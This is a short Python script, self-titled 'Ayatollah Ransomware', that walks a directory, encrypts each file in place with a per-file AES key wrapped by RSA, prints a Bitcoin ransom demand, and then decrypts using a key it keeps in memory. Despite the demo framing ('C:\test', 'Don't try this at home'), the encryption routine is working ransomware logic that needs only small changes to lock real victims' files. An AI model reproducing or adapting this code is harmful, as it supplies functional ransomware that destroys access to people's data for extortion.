import os
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Generate RSA key
def generate_rsa_key():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

# Encrypt AES key with RSA
def encrypt_aes_key(rsa_public_key, aes_key):
    encrypted_key = rsa_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

# Decrypt AES key with RSA
def decrypt_aes_key(rsa_private_key, encrypted_key):
    aes_key = rsa_private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return aes_key

# Encrypt file with AES
def encrypt_file(file_path, aes_key):
    iv = os.urandom(16)  # Generate a random IV
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(file_path, "rb") as file:
        plaintext = file.read()

    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    with open(file_path, "wb") as file:
        file.write(iv + ciphertext)  # Store IV with ciphertext

# Decrypt file with AES
def decrypt_file(file_path, aes_key):
    with open(file_path, "rb") as file:
        iv = file.read(16)  # Read the IV
        ciphertext = file.read()

    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    with open(file_path, "wb") as file:
        file.write(plaintext)

# Encrypt directory
def encrypt_directory(directory, rsa_public_key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            print(f"Encrypting: {file_path}")

            aes_key = os.urandom(32)  # Generate a random AES key
            encrypt_file(file_path, aes_key)

            encrypted_key = encrypt_aes_key(rsa_public_key, aes_key)

            key_file_path = file_path + ".key"
            with open(key_file_path, "wb") as key_file:
                key_file.write(encrypted_key)

# Decrypt directory
def decrypt_directory(directory, rsa_private_key):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".key"):
                continue

            file_path = os.path.join(root, file)
            key_file_path = file_path + ".key"

            if not os.path.exists(key_file_path):
                print(f"Key file missing for: {file_path}")
                continue

            print(f"Decrypting: {file_path}")

            with open(key_file_path, "rb") as key_file:
                encrypted_key = key_file.read()

            aes_key = decrypt_aes_key(rsa_private_key, encrypted_key)
            decrypt_file(file_path, aes_key)

# Main function
def main():
    print("Ayatollah Ransomware Start")

    private_key, public_key = generate_rsa_key()

    # Encrypt directory
    encrypt_directory("C:\\test", public_key)

    # Display ransom message
    print("\n\n========================================")
    print("Every file is encrypted!")
    print("Send 0.01 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    print("Don't try this at home")
    print("========================================\n\n")

    # Decrypt directory
    print("Starting decryption...")
    decrypt_directory("C:\\test", private_key)

if __name__ == "__main__":
    main()